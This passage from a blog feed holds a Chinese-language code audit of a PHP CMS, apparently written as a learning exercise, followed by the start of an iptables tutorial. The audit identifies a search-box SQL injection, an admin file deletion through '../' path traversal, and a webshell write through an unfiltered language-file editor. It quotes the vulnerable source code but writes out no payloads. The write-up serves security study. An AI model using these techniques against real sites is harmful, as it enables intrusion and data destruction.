class="string">&#x27;info_text&#x27;</span>,$info_text);</span><br><span class="line">$smarty-&gt;assign(<span class="string">&#x27;link_text&#x27;</span>,$lang[<span class="string">&#x27;go_back&#x27;</span>]);</span><br><span class="line">$smarty-&gt;assign(<span class="string">&#x27;link_href&#x27;</span>,url(<span class="keyword">array</span>(<span class="string">&#x27;channel&#x27;</span>=&gt;<span class="string">&#x27;message&#x27;</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬çš„è¾“å…¥æ˜¯è¢«ä¼ å…¥äº†<code>post</code> å‡½æ•°è¿›è¡Œæ‰§è¡Œï¼Œè·Ÿè¿›è¯¥å‡½æ•°ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è·å–post</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">post</span>(<span class="params">$val,$filter = <span class="string">&#x27;strict&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">return</span> $filter(<span class="keyword">isset</span>($_POST[$val])?$_POST[$val]:<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡äº†<code>strict</code> æ¡ä»¶çš„è¿‡æ»¤å‡½æ•°ï¼Œæ‰¾åˆ°è¿™ä¸ªçš„å®šä¹‰å¤„ã€‚</p><p>include/function.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ä¸¥æ ¼è¿‡æ»¤å­—ç¬¦ä¸²ä¸­çš„å±é™©ç¬¦å·</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">strict</span>(<span class="params">$str</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">if</span>(S_MAGIC_QUOTES_GPC)</span><br><span class="line">   &#123;</span><br><span class="line">      $str = stripslashes($str);</span><br><span class="line">   &#125;</span><br><span class="line">   $str = str_replace(<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;&amp;#60;&#x27;</span>,$str);</span><br><span class="line">   $str = str_replace(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;&amp;#62;&#x27;</span>,$str);</span><br><span class="line">   $str = str_replace(<span class="string">&#x27;?&#x27;</span>,<span class="string">&#x27;&amp;#63;&#x27;</span>,$str);</span><br><span class="line">   $str = str_replace(<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;&amp;#37;&#x27;</span>,$str);</span><br><span class="line">   $str = str_replace(chr(<span class="number">39</span>),<span class="string">&#x27;&amp;#39;&#x27;</span>,$str);</span><br><span class="line">   $str = str_replace(chr(<span class="number">34</span>),<span class="string">&#x27;&amp;#34;&#x27;</span>,$str);</span><br><span class="line">   $str = str_replace(chr(<span class="number">13</span>).chr(<span class="number">10</span>),<span class="string">&#x27;&lt;br /&gt;&#x27;</span>,$str);</span><br><span class="line">   <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°html çš„é—­åˆæ ‡ç­¾è¢«è½¬ä¹‰äº†ï¼Œæ‰€ä»¥æ²¡æ³•XSS</p><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">edit_pwd</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">safe(<span class="string">&#x27;edit_pwd&#x27;</span>);</span><br><span class="line"><span class="keyword">global</span> $global,$smarty,$lang;</span><br><span class="line">$old_pwd = post(<span class="string">&#x27;old_pwd&#x27;</span>);</span><br><span class="line">$new_pwd = post(<span class="string">&#x27;new_pwd&#x27;</span>);</span><br><span class="line">$re_pwd = post(<span class="string">&#x27;re_pwd&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($old_pwd) &lt; <span class="number">6</span> || strlen($old_pwd) &gt; <span class="number">15</span> || strlen($new_pwd) &lt; <span class="number">6</span> || strlen($new_pwd) &gt; <span class="number">15</span> || $new_pwd != $re_pwd)</span><br><span class="line">&#123;</span><br><span class="line">$info_text = $lang[<span class="string">&#x27;submit_error_info&#x27;</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$use_password = md5($old_pwd);</span><br><span class="line">$obj = <span class="keyword">new</span> users();</span><br><span class="line">$obj-&gt;set_where(<span class="string">&#x27;use_id = &#x27;</span>.$global[<span class="string">&#x27;user_id&#x27;</span>]);</span><br><span class="line">$obj-&gt;set_where(<span class="string">&quot;use_password = &#x27;$use_password&#x27;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>($obj-&gt;get_count() &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">$use_password = md5($new_pwd);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;use_password&#x27;</span>,$use_password);</span><br><span class="line">$obj-&gt;set_where(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">$obj-&gt;set_where(<span class="string">&#x27;use_id = &#x27;</span>.$global[<span class="string">&#x27;user_id&#x27;</span>]);</span><br><span class="line">$obj-&gt;edit();</span><br><span class="line">$info_text = $lang[<span class="string">&#x27;over&#x27;</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$info_text = $lang[<span class="string">&#x27;old_pwd_error&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$smarty-&gt;assign(<span class="string">&#x27;info_text&#x27;</span>,$info_text);</span><br><span class="line">$smarty-&gt;assign(<span class="string">&#x27;link_text&#x27;</span>,$lang[<span class="string">&#x27;go_back&#x27;</span>]);</span><br><span class="line">$smarty-&gt;assign(<span class="string">&#x27;link_href&#x27;</span>,url(<span class="keyword">array</span>(<span class="string">&#x27;entrance&#x27;</span>=&gt;$global[<span class="string">&#x27;entrance&#x27;</span>],<span class="string">&#x27;channel&#x27;</span>=&gt;<span class="string">&#x27;user&#x27;</span>,<span class="string">&#x27;mod&#x27;</span>=&gt;<span class="string">&#x27;profile&#x27;</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>CSRF ä¿®æ”¹ç”¨æˆ·å¯†ç ï¼Œéœ€è¦æ—§å¯†ç ï¼Œè¡Œä¸é€šã€‚</p><h2 id="å¯æ§å˜é‡è¿‡æ»¤"><a href="#å¯æ§å˜é‡è¿‡æ»¤" class="headerlink" title="å¯æ§å˜é‡è¿‡æ»¤"></a>å¯æ§å˜é‡è¿‡æ»¤</h2><h3 id="session-è¿‡æ»¤"><a href="#session-è¿‡æ»¤" class="headerlink" title="session è¿‡æ»¤"></a>session è¿‡æ»¤</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è·å–session</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_session</span>(<span class="params">$name,$filter = <span class="string">&#x27;strict&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">if</span>(S_SESSION)</span><br><span class="line">   &#123;</span><br><span class="line">      <span class="keyword">return</span> $filter(<span class="keyword">isset</span>($_SESSION[$name])?$_SESSION[$name]:<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> $filter(<span class="keyword">isset</span>($_COOKIE[$name])?$_COOKIE[$name]:<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="cookie-è¿‡æ»¤"><a href="#cookie-è¿‡æ»¤" class="headerlink" title="cookie è¿‡æ»¤"></a>cookie è¿‡æ»¤</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è®¾ç½®cookie</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_cookie</span>(<span class="params">$name,$value,$filter = <span class="string">&#x27;strict&#x27;</span>,$expire = <span class="number">0</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">if</span>($expire == <span class="number">0</span>)</span><br><span class="line">   &#123;</span><br><span class="line">      setcookie($name,$filter($value));</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      setcookie($name,$filter($value),$expire);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="admin-ç™»å½•"><a href="#admin-ç™»å½•" class="headerlink" title="admin ç™»å½•"></a>admin ç™»å½•</h3><p>admin/module/info_main.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">admin_login</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   safe(<span class="string">&#x27;admin_login&#x27;</span>);</span><br><span class="line">   <span class="keyword">global</span> $smarty,$lang;</span><br><span class="line">   $username = substr(post(<span class="string">&#x27;username&#x27;</span>),<span class="number">0</span>,<span class="number">30</span>);</span><br><span class="line">   $password = substr(post(<span class="string">&#x27;password&#x27;</span>),<span class="number">0</span>,<span class="number">30</span>);</span><br><span class="line">   <span class="keyword">if</span>($username == <span class="string">&#x27;&#x27;</span> || $password == <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">   &#123;</span><br><span class="line">      unset_session(<span class="string">&#x27;admin_username&#x27;</span>);</span><br><span class="line">      unset_session(<span class="string">&#x27;admin_password&#x27;</span>);</span><br><span class="line">      $info_text = <span class="string">&#x27;å¯¹ä¸èµ·ï¼Œç”¨æˆ·åå’Œå¯†ç ä¸èƒ½ä¸ºç©º&#x27;</span>;</span><br><span class="line">      $link_text = <span class="string">&#x27;è¿”å›é‡æ–°ç™»å½•&#x27;</span>;</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">     â€¦â€¦</span><br></pre></td></tr></table></figure><h3 id="user-ç™»å½•"><a href="#user-ç™»å½•" class="headerlink" title="user ç™»å½•"></a>user ç™»å½•</h3><p>index/module/info_main.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">user_login</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   safe(<span class="string">&#x27;user_login&#x27;</span>);</span><br><span class="line">   <span class="keyword">global</span> $global,$smarty,$lang;</span><br><span class="line">   $info_text = post(<span class="string">&#x27;info_text&#x27;</span>);</span><br><span class="line">   $link_text = post(<span class="string">&#x27;link_text&#x27;</span>);</span><br><span class="line">   $link_href = post(<span class="string">&#x27;link_href&#x27;</span>);</span><br><span class="line">   $username = post(<span class="string">&#x27;username&#x27;</span>);</span><br><span class="line">   $password = post(<span class="string">&#x27;password&#x27;</span>);</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">if</span>(strlen($username) &gt; <span class="number">30</span>)&#123;$username = substr($username,<span class="number">30</span>);&#125;</span><br><span class="line">   <span class="keyword">if</span>(strlen($password) &gt; <span class="number">30</span>)&#123;$password = substr($password,<span class="number">30</span>);&#125;</span><br><span class="line">   <span class="keyword">if</span>($username == <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> $password == <span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼ŒåŸºæœ¬éƒ½ç»è¿‡äº†å¸¦æœ‰è¿‡æ»¤çš„å‡½æ•°å¤„ç†ã€‚æ‰€ä»¥åƒï¼ŒSQLæ³¨å…¥å’ŒXSS è¿™ç§éœ€è¦æ„é€ ç‰¹æ®Šç¬¦å·çš„æ¼æ´å‡ ä¹å¾ˆéš¾äº†</p><h1 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h1><p>åŸºäºåŠŸèƒ½ç‚¹å»æµ‹ï¼Œå…ˆé«˜å±åä½å±ã€‚åå°ä¸€èˆ¬é˜²å¾¡è¾ƒå¼±ï¼Œä»åå°çªç ´è¾ƒå®¹æ˜“ã€‚è€Œåå°å­˜åœ¨çš„åŠŸèƒ½æœ‰ï¼šå›¾ç‰‡ã€æ–‡ä»¶ã€æ¨¡æ¿ç®¡ç†ã€åˆ é™¤ã€ç•™è¨€å®¡æ ¸ï¼Œç­‰å…¶ä»–åŠŸèƒ½ã€‚</p><h2 id="å‰å°æœç´¢æ¡†SQL-æ³¨å…¥"><a href="#å‰å°æœç´¢æ¡†SQL-æ³¨å…¥" class="headerlink" title="å‰å°æœç´¢æ¡†SQL æ³¨å…¥"></a>å‰å°æœç´¢æ¡†SQL æ³¨å…¥</h2><p>å¼€å¯MySQL ç›‘æ§ï¼Œç„¶åå†æœç´¢æ¡†è¿›è¡Œæœç´¢ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184500.png" alt="image-20200912161945551"></p><p>å¦‚å›¾ï¼Œ123ï¼Œè¢«å¸¦å…¥SQLè¯­å¥è¿›è¡ŒæŸ¥è¯¢ï¼Œå•å¼•å·é—­åˆã€‚å°†å…³é”®å­—åœ¨æ•´ä¸ªæ–‡ä»¶å¤¹ä¸­æœç´¢ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184441.png" alt="image-20200912162117271"></p><p>è¿™é‡Œå…ˆrawurldecode è§£ç ï¼Œç„¶åå¸¦å…¥æ‹¼æ¥è¿›å…¥æŸ¥è¯¢ã€‚</p><p>ç„¶åä¸‹æ–­ç‚¹è¿›è¡Œåˆ†æï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184427.png" alt="image-20200912165411168"></p><p>ç›´æ¥ä¸Šsqlmapã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184409.png" alt="image-20200912155851842"></p><h2 id="åå°ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´"><a href="#åå°ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´" class="headerlink" title="åå°ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´"></a>åå°ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´</h2><p><strong>/admin/deal.php</strong> </p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184208.png" alt="image-20200912144227587"></p><p>æ­¤å¤„é‡‡ç”¨äº†ç™½åå•çš„å½¢å¼ï¼Œåªèƒ½åˆ é™¤ æŒ‡å®šçš„ä¸‰ä¸ªç›®å½•ä¸‹çš„æ–‡ä»¶ã€‚ä½†æ˜¯å¿½ç•¥äº†å¯ä»¥ç”¨<code>../</code>æ¥ç»•è¿‡ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(substr($path,<span class="number">0</span>,strlen($dir[$i])) == $dir[$i])</span><br><span class="line">&#123;</span><br><span class="line">   $flag = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>substr ä»ç¬¬<code>$path</code>çš„ç¬¬ä¸€ä¸ªå­—æ¯å¼€å§‹å¾€ååˆ¤æ–­ï¼Œæˆªå–pathå‰åŠéƒ¨åˆ†é•¿åº¦å’Œç™½åå•æ˜¯å¦ç›¸ç­‰ï¼Œå³æ˜¯å¦æ˜¯ç™½åå•é‡Œçš„é‚£å‡ ä¸ªç›®å½•ï¼Œæ˜¯ï¼Œç„¶å<code>unlink</code>åˆ é™¤æ‰ã€‚</p><p>æˆåŠŸåˆ é™¤æ–‡ä»¶æ—¶ï¼Œè¿”å›1ã€‚</p><p>è¿™é‡Œæˆ‘é‡åˆ°äº†ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯è¿™ä¸ªåŸŸåæ˜¯é€šè¿‡MAMPä¿®æ”¹çš„æœ¬åœ°HOSTSæ–‡ä»¶è§£æçš„ï¼Œç„¶åæ‰¾åˆ°äº†ä¸€ç¯‡æ–‡ç« ï¼Œ<a href="https://www.jianshu.com/p/3018b2697bb0%EF%BC%8C%E7%AE%80%E5%8D%95%E8%AE%BE%E7%BD%AE%E4%B8%80%E4%B8%8B%E5%B0%B1%E5%8F%AF%E4%BB%A5%E4%BA%86%E3%80%82">https://www.jianshu.com/p/3018b2697bb0ï¼Œç®€å•è®¾ç½®ä¸€ä¸‹å°±å¯ä»¥äº†ã€‚</a></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184157.png" alt="image-20200912152353172"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184144.png" alt="image-20200912152108244"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184031.gif" alt="æ¼æ´æ¼”ç¤º"></p><h2 id="åå°ç¼–è¾‘è¯­è¨€æ–‡ä»¶è®¾ç½®GetShell"><a href="#åå°ç¼–è¾‘è¯­è¨€æ–‡ä»¶è®¾ç½®GetShell" class="headerlink" title="åå°ç¼–è¾‘è¯­è¨€æ–‡ä»¶è®¾ç½®GetShell"></a>åå°ç¼–è¾‘è¯­è¨€æ–‡ä»¶è®¾ç½®GetShell</h2><p>æˆåŠŸç¼–è¾‘åï¼Œå›æ˜¾ ç¼–è¾‘è¯­è¨€åŒ…æˆåŠŸã€‚é‚£ä¹ˆåœ¨æ•´ä¸ªæ–‡ä»¶ä¸­æœç´¢å³å¯å®šä½åˆ°ä»£ç ã€‚<br>**/admin/module/file/deal.php**</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">edit_lang</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">global</span> $smarty,$lang;</span><br><span class="line">   $path = post(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line">   $lang_text = post(<span class="string">&#x27;lang_text&#x27;</span>,<span class="string">&#x27;no_filter&#x27;</span>);</span><br><span class="line">   file_put_contents($path,$lang_text);</span><br><span class="line">   $smarty-&gt;assign(<span class="string">&#x27;info_text&#x27;</span>,<span class="string">&#x27;ç¼–è¾‘è¯­è¨€åŒ…æˆåŠŸ&#x27;</span>);</span><br><span class="line">   $smarty-&gt;assign(<span class="string">&#x27;link_text&#x27;</span>,<span class="string">&#x27;è¿”å›ä¸Šä¸€é¡µ&#x27;</span>);</span><br><span class="line">   $smarty-&gt;assign(<span class="string">&#x27;link_href&#x27;</span>,url(<span class="keyword">array</span>(<span class="string">&#x27;channel&#x27;</span>=&gt;<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;mod&#x27;</span>=&gt;<span class="string">&#x27;lang_edit&#x27;</span>,<span class="string">&#x27;path&#x27;</span>=&gt;rawurlencode($path))));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¯¥å‡½æ•°ä¸­ï¼Œç»è¿‡<code>post()</code> å‡½æ•°è¿‡æ»¤ï¼Œä½†æ˜¯å¯¹äº<code>$lang_text</code> çš„è¿‡æ»¤è§„åˆ™æ˜¯<code>no_filter</code> ï¼Œè·Ÿè¿›æŸ¥çœ‹ä¸€ä¸‹è¯¥è§„åˆ™ã€‚</p><p>/include/function.php,104è¡Œã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ä¸è¿‡æ»¤</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">no_filter</span>(<span class="params">$str</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">if</span>(S_MAGIC_QUOTES_GPC)</span><br><span class="line">   &#123;</span><br><span class="line">      $str = stripslashes($str); <span class="comment">// åˆ é™¤åæ–œæ </span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ²¡æœ‰è¿‡æ»¤ <code>$lang_text</code> å°±é€šè¿‡<code>file_put_contents</code> å†™å…¥æ–‡ä»¶ï¼Œé‚£ä¹ˆè¿™é‡Œå°±å¯ä»¥å†™WebShellã€‚</p><p>åŒæ ·çš„ï¼Œä¸‹æ–­ç‚¹æ¥è°ƒè¯•åˆ†æã€‚</p><p>step into ï¼Œæ…¢æ…¢ç‚¹ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œæ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œå†™å…¥webshell</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184010.png" alt="image-20200912173700069"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912183848.png" alt="image-20200912173822681"></p><p><code>$path</code> å¯æ§çš„ï¼Œè¿™é‡Œåªéœ€è¦æŠŠ<code>$path</code> æ”¹ä¸ºä¸€ä¸ª<code>.php</code> åç¼€çš„å°±å¯ä»¥GetShell äº†ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912183833.png" alt="image-20200912174519203"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912183821.png" alt="image-20200912174743837"></p><h1 id="å®¡è®¡æ€»ç»“"><a href="#å®¡è®¡æ€»ç»“" class="headerlink" title="å®¡è®¡æ€»ç»“"></a>å®¡è®¡æ€»ç»“</h1><p>åŸºæœ¬ä¸Šæ˜¯ç…§æ¬ç…§æŠ„åˆ«äººçš„æ€è·¯æ¥æçš„ï¼Œæ€»æ¯”èººç€ç©æ‰‹æœºå¼ºï¼Œä¹Ÿé‡åˆ°äº†ä¸€äº›é—®é¢˜ï¼Œæ¯”å¦‚Burp Suite è®¾ç½® åŸŸåå’Œip ç»‘å®šï¼Œphpstorm è°ƒè¯•åˆ†æï¼Œæ€»ä¹‹ï¼Œèƒ½å­¦åˆ°ä¸œè¥¿å°±è¡Œã€‚å­¦åˆ°äº†æ€è·¯ï¼Œä¸‹ä¸€æ­¥å°±æ˜¯å¤ç°thinkphp çš„å†å²æ¼æ´ï¼Œå’Œthinkcmf æˆ–è€…å…¶ä»–phpæ¡†æ¶çš„å†å²æ¼æ´ï¼Œå­¦ä¹ å®Œä¹‹åå°±å»æ‰¾cmsè¿›è¡Œå®æˆ˜ï¼ï¼ˆå…¶å®è¿™ä¸ªå·²ç»æç½®äº†å¿«åŠå¹´äº†ã€‚</p><blockquote><p>ä¸€ä¸ªä¸èƒ½å­œå­œä¸å€¦ï¼Œå§‹ç»ˆå¤„äºæ–°çŸ¥è¯†ã€æ–°æŠ€æœ¯å­¦ä¹ çŠ¶æ€ä¸‹çš„å®‰å…¨çˆ±å¥½è€…ï¼Œå¿…ç„¶ä¼šè¢«è¶…è¶Šå’Œå–ä»£ã€‚</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;p&gt;å‚è€ƒèµ„æ–™ï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://v0w.top/2020/08/26/CodeAudit-php/&quot;&gt;ä»£ç å®¡è®¡å¸¸è§çš„ä¸‰ç§æ–¹æ³•ï¼ˆPHPç¯‡ï¼‰&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.sqlsec.co</summary>
      
    
    
    
    
    <category term="ä»£ç å®¡è®¡" scheme="https://hack-for.fun/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="æ¼æ´æŒ–æ˜" scheme="https://hack-for.fun/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
  <entry>
    <title>iptables å­¦ä¹ </title>
    <link href="https://hack-for.fun/13bb2df2.html"/>
    <id>https://hack-for.fun/13bb2df2.html</id>
    <published>2020-08-26T07:17:09.000Z</published>
    <updated>2020-08-26T15:25:09.938Z</updated>
    
    <content type="html"><![CDATA[<p>å‚è€ƒèµ„æ–™ï¼š </p><p>(å†…å®¹å’Œå›¾ç‰‡)</p><p>å…¨æ•™ç¨‹ç³»åˆ—</p><p><a href="http://www.zsythink.net/archives/tag/iptables/">iptables å…¥é—¨ç³»åˆ—</a></p><blockquote><p>ä½œä¸ºå®‰å…¨ç‹— ï¼Œè‡ªè®¤ä¸ºçŸ¥é“æ¦‚å¿µå’ŒåŸºç¡€æ“ä½œå°±è¡Œäº†ï¼ˆæå®‰å…¨çš„è¦å­¦çš„ä¸œè¥¿çœŸçš„å¤ªå¤šäº†ã€‚</p></blockquote><p>åŸä½œè€…ä¸€å¼€å§‹è®²äº†é˜²ç«å¢™çš„çŸ¥è¯†ï¼Œç®—ä¸é”™çš„ç§‘æ™®ã€‚</p><h1 id="é˜²ç«å¢™"><a href="#é˜²ç«å¢™" class="headerlink" title="é˜²ç«å¢™"></a>é˜²ç«å¢™</h1><blockquote><p>ä»é€»è¾‘ä¸Šè®²ã€‚é˜²ç«å¢™å¯ä»¥å¤§ä½“åˆ†ä¸ºä¸»æœºé˜²ç«å¢™å’Œç½‘ç»œé˜²ç«å¢™ã€‚</p></blockquote><p>ä¸»æœºé˜²ç«å¢™ï¼šé’ˆå¯¹äºå•ä¸ªä¸»æœºè¿›è¡Œé˜²æŠ¤ã€‚</p><p>ç½‘ç»œé˜²ç«å¢™ï¼šå¾€å¾€å¤„äºç½‘ç»œå…¥å£æˆ–è¾¹ç¼˜ï¼Œé’ˆå¯¹äºç½‘ç»œå…¥å£è¿›è¡Œé˜²æŠ¤ï¼ŒæœåŠ¡äºé˜²ç«å¢™èƒŒåçš„æœ¬åœ°å±€åŸŸç½‘ã€‚</p><p>ç½‘ç»œé˜²ç«å¢™å’Œä¸»æœºé˜²ç«å¢™å¹¶ä¸å†²çªï¼Œå¯ä»¥ç†è§£ä¸ºï¼Œç½‘ç»œé˜²ç«å¢™ä¸»å¤–ï¼ˆé›†ä½“ï¼‰ï¼Œ 